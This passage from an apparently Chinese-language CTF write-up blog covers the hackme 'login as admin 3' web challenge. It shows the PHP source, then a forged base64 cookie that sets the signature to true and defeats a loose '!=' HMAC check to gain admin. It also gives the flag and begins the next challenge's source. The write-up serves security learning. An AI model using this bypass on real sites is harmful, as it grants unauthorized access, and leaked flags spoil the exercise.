</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 66</span><span>    &lt;<span style=color:#ff6ac1>meta</span> <span style=color:#57c7ff>name</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;viewport&#34;</span> <span style=color:#57c7ff>content</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;width=device-width, initial-scale=1&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 67</span><span>    &lt;<span style=color:#ff6ac1>link</span> <span style=color:#57c7ff>rel</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;stylesheet&#34;</span> <span style=color:#57c7ff>href</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;/bootstrap/css/bootstrap.min.css&#34;</span> <span style=color:#57c7ff>media</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;all&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 68</span><span>&lt;/<span style=color:#ff6ac1>head</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 69</span><span>&lt;<span style=color:#ff6ac1>body</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 70</span><span>    &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;jumbotron&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 71</span><span>        &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;container&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 72</span><span>            &lt;<span style=color:#ff6ac1>h1</span>&gt;Login as Admin 3&lt;/<span style=color:#ff6ac1>h1</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 73</span><span>        &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 74</span><span>    &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 75</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 76</span><span>    &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;container&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 77</span><span>        &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;navbar&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 78</span><span>            &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;container-fluid&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 79</span><span>                &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;navbar-header&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 80</span><span>                    &lt;<span style=color:#ff6ac1>a</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;navbar-brand&#34;</span> <span style=color:#57c7ff>href</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;/&#34;</span>&gt;Please Hack Me&lt;/<span style=color:#ff6ac1>a</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 81</span><span>                &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 82</span><span>                &lt;<span style=color:#ff6ac1>ul</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;nav navbar-nav&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 83</span><span>                    &lt;<span style=color:#ff6ac1>li</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 84</span><span>                        &lt;<span style=color:#ff6ac1>a</span> <span style=color:#57c7ff>href</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;/scoreboard&#34;</span>&gt;Scoreboard&lt;/<span style=color:#ff6ac1>a</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 85</span><span>                    &lt;/<span style=color:#ff6ac1>li</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 86</span><span>                    &lt;<span style=color:#ff6ac1>li</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 87</span><span>                        &lt;<span style=color:#ff6ac1>a</span> <span style=color:#57c7ff>href</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;?show_source=1&#34;</span> <span style=color:#57c7ff>target</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;_blank&#34;</span>&gt;Source Code&lt;/<span style=color:#ff6ac1>a</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 88</span><span>                    &lt;/<span style=color:#ff6ac1>li</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 89</span><span><span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>if</span>(<span style=color:#ff5c57>$user</span>)<span style=color:#ff6ac1>:</span> <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 90</span><span>                    &lt;<span style=color:#ff6ac1>li</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 91</span><span>                        &lt;<span style=color:#ff6ac1>a</span> <span style=color:#57c7ff>href</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;?logout=1&#34;</span>&gt;Logout&lt;/<span style=color:#ff6ac1>a</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 92</span><span>                    &lt;/<span style=color:#ff6ac1>li</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 93</span><span><span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>endif</span>; <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 94</span><span>                &lt;/<span style=color:#ff6ac1>ul</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 95</span><span>            &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 96</span><span>        &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 97</span><span>    &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 98</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 99</span><span><span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>if</span>(<span style=color:#ff5c57>$error</span> <span style=color:#ff6ac1>!==</span> <span style=color:#ff6ac1>null</span>)<span style=color:#ff6ac1>:</span> <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">100</span><span>    &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;container&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">101</span><span>        &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;alert alert-danger&#34;</span>&gt;<span style=color:#78787e>&lt;?</span><span style=color:#ff6ac1>=</span><span style=color:#ff5c57>$error</span><span style=color:#78787e>?&gt;</span>&lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">102</span><span>    &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">103</span><span><span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>endif</span>; <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">104</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">105</span><span>    &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;container&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">106</span><span>        &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;col-md-6 col-md-offset-3&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">107</span><span><span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>if</span>(<span style=color:#ff6ac1>!</span><span style=color:#ff5c57>$user</span>)<span style=color:#ff6ac1>:</span> <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">108</span><span><span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>if</span>(<span style=color:#ff5c57>$user</span> <span style=color:#ff6ac1>===</span> <span style=color:#ff6ac1>false</span>)<span style=color:#ff6ac1>:</span> <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">109</span><span>            &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;alert alert-danger&#34;</span>&gt;Login failed&lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">110</span><span><span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>endif</span>; <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">111</span><span>            &lt;<span style=color:#ff6ac1>form</span> <span style=color:#57c7ff>action</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;.&#34;</span> <span style=color:#57c7ff>method</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;POST&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">112</span><span>                &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-group&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">113</span><span>                    &lt;<span style=color:#ff6ac1>label</span> <span style=color:#57c7ff>for</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;name&#34;</span>&gt;User:&lt;/<span style=color:#ff6ac1>label</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">114</span><span>                    &lt;<span style=color:#ff6ac1>input</span> <span style=color:#57c7ff>id</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;name&#34;</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-control&#34;</span> <span style=color:#57c7ff>type</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;text&#34;</span> <span style=color:#57c7ff>name</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;name&#34;</span> <span style=color:#57c7ff>placeholder</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;User&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">115</span><span>                &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">116</span><span>                &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-group&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">117</span><span>                    &lt;<span style=color:#ff6ac1>label</span> <span style=color:#57c7ff>for</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;password&#34;</span>&gt;Pass:&lt;/<span style=color:#ff6ac1>label</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">118</span><span>                    &lt;<span style=color:#ff6ac1>input</span> <span style=color:#57c7ff>id</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;password&#34;</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-control&#34;</span> <span style=color:#57c7ff>type</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;text&#34;</span> <span style=color:#57c7ff>name</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;password&#34;</span> <span style=color:#57c7ff>placeholder</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;Password&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">119</span><span>                &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">120</span><span>                &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-group&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">121</span><span>                    &lt;<span style=color:#ff6ac1>input</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-control btn btn-primary&#34;</span> <span style=color:#57c7ff>type</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;submit&#34;</span> <span style=color:#57c7ff>value</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;Login&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">122</span><span>                &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">123</span><span>            &lt;/<span style=color:#ff6ac1>form</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">124</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">125</span><span>            &lt;<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">126</span><span>                &lt;<span style=color:#ff6ac1>p</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">127</span><span>                    You can login with &lt;<span style=color:#ff6ac1>code</span>&gt;guest&lt;/<span style=color:#ff6ac1>code</span>&gt; / &lt;<span style=color:#ff6ac1>code</span>&gt;guest&lt;/<span style=color:#ff6ac1>code</span>&gt;.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">128</span><span>                &lt;/<span style=color:#ff6ac1>p</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">129</span><span>            &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">130</span><span><span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>else</span><span style=color:#ff6ac1>:</span> <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">131</span><span>            &lt;<span style=color:#ff6ac1>h3</span>&gt;Hi, <span style=color:#78787e>&lt;?</span><span style=color:#ff6ac1>=</span>htmlentities(<span style=color:#ff5c57>$user</span>[<span style=color:#5af78e>&#39;name&#39;</span>])<span style=color:#78787e>?&gt;</span>&lt;/<span style=color:#ff6ac1>h3</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">132</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">133</span><span>            &lt;<span style=color:#ff6ac1>h4</span>&gt;<span style=color:#78787e>&lt;?</span><span style=color:#ff6ac1>=</span>sprintf(<span style=color:#5af78e>&#34;You %s admin!&#34;</span>, <span style=color:#ff5c57>$user</span>[<span style=color:#5af78e>&#39;admin&#39;</span>] <span style=color:#ff6ac1>?</span> <span style=color:#5af78e>&#34;are&#34;</span> <span style=color:#ff6ac1>:</span> <span style=color:#5af78e>&#34;are not&#34;</span>)<span style=color:#78787e>?&gt;</span>&lt;/<span style=color:#ff6ac1>h4</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">134</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">135</span><span>            <span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>if</span>(<span style=color:#ff5c57>$user</span>[<span style=color:#5af78e>&#39;admin&#39;</span>]) printf(<span style=color:#5af78e>&#34;&lt;code&gt;%s&lt;/code&gt;&#34;</span>, htmlentities(<span style=color:#ff5c57>$flag</span>)); <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">136</span><span><span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>endif</span>; <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">137</span><span>        &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">138</span><span>    &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">139</span><span>&lt;/<span style=color:#ff6ac1>body</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">140</span><span>&lt;/<span style=color:#ff6ac1>html</span>&gt;
</span></span></code></pre></div><p>稍微看過之後，大概了解了流程是，使用者輸入帳號密碼後，會將用戶資訊附上簽章，以<code>json</code>格式進行<code>base64</code>編碼後寫在 cookie 中。<br>在驗證使用者資訊時，會再次運算使用者資訊，並與簽章做判斷是否相符。</p><p>乍看之下該流程似乎無懈可擊，但有個點很奇怪&mldr;<br>為何在大多數判斷式都是以「<code>===</code>」來判斷，但在<code>load_user()</code>這個 funcion 中卻是以<code>!=</code>判斷，這是不精確的一種邏輯運算子(應該使用<code>!==</code>更為精確)。<br>(p.s. 如果不清楚<code>==</code>與<code>===</code>差別，請自行 Google，本文不再贅述)</p><p>這會讓我想到著名的 PHP 處理 <code>MD5</code> 的 <code>0e</code> 開頭字串總是判斷為<code>0</code>的特性。(使用<code>==</code>情況下)</p><hr><p>這題主要重點是要將判斷式<code>hash_hmac('sha512', $unserialized['data'], $secret) != $unserialized['sig']</code>給繞過。<br>先以<code>guest/guest</code>登入訪客帳號。<br>這時候可以看到已經生成一個<code>cookie</code>叫做<code>user</code>了。</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/25/1_hua6bb1d21ba93397b973c28b6612a383f_27632_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/25/1_hua6bb1d21ba93397b973c28b6612a383f_27632_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/25/1_hua6bb1d21ba93397b973c28b6612a383f_27632_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/25/1_hua6bb1d21ba93397b973c28b6612a383f_27632_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/25/1_hua6bb1d21ba93397b973c28b6612a383f_27632_660x0_resize_box_3.png alt style=width:100%></figure></p><p>將其值以<code>base64</code>解碼後，會得到一串<code>json</code>格式的字串「<code>{"sig":"75d53f97acd211098a052b305d1caf191436c6d29d1936d947f8fde7733008a3968edaa4b4a68242db8696030505273914ded688d459e8c9225200d729a0b98e","data":"[\"guest\",false]"}</code>」。</p><p>其中<code>sig</code>就是憑證，而<code>data</code>裝的則是<code>使用者</code>及<code>是否為管理員</code>。<br>我們需要拿到管理員權限，因此先將驗證是否為管理員的欄位改為<code>true</code>。<br>但如果就這麼將 cookie 塞回去則 server 會在判斷時發現<code>data</code>內容與對應的簽章不符而導致驗證失敗。</p><p>接著將<code>sig</code>改為<code>true</code>。</p><p>如此一來判斷式將會將會變成<code>hash_hmac('sha512', $unserialized['data'], $secret) != true</code></p><p>不管經過<code>hash_hmac()</code>運算過後的結果如何，只要不出錯，都一律被當作<code>true</code>給<code>!=</code>做判斷，所以該判斷式將一律為<code>false</code>，也就可以繞過了。</p><p>Payload <code>{"sig":true,"data":"[\"guest\",true]"}</code>，記得<code>base64</code>編碼後再塞回去 cookie。(<code>eyJzaWciOnRydWUsImRhdGEiOiJbXCJndWVzdFwiLHRydWVdIn0=</code>)</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/25/2_huaac23fb98802d17f44924404c2a9400e_14579_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/25/2_huaac23fb98802d17f44924404c2a9400e_14579_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/25/2_huaac23fb98802d17f44924404c2a9400e_14579_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/25/2_huaac23fb98802d17f44924404c2a9400e_14579_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/25/2_huaac23fb98802d17f44924404c2a9400e_14579_660x0_resize_box_3.png alt style=width:100%></figure></p><p>Flag <code>FLAG{H3110, 4dm1n1576a70r... 1f y0u kn0w my 53cR37 and Use STRONG COMPARE pls}</code></p><hr><h2 class="relative group">26. <a href=https://ctf.hackme.quest/login4 target=_blank>login as admin 4</a><div id=26-login-as-admin-4httpsctfhackmequestlogin4 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#26-login-as-admin-4httpsctfhackmequestlogin4 aria-label=定位點>#</a></span></h2><blockquote><p>login as admin</p></blockquote><p>Source code:</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-phtml data-lang=phtml><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#78787e>&lt;?php</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#ff6ac1>require</span>(<span style=color:#5af78e>&#39;config.php&#39;</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#ff6ac1>if</span>(<span style=color:#ff5c57>$_GET</span>[<span style=color:#5af78e>&#39;show_source&#39;</span>] <span style=color:#ff6ac1>===</span> <span style=color:#5af78e>&#39;1&#39;</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>    highlight_file(<span style=color:#ff9f43>__FILE__</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>    <span style=color:#ff6ac1>exit</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#ff6ac1>if</span>(<span style=color:#ff5c57>$_POST</span>[<span style=color:#5af78e>&#39;name&#39;</span>] <span style=color:#ff6ac1>===</span> <span style=color:#5af78e>&#39;admin&#39;</span>) {
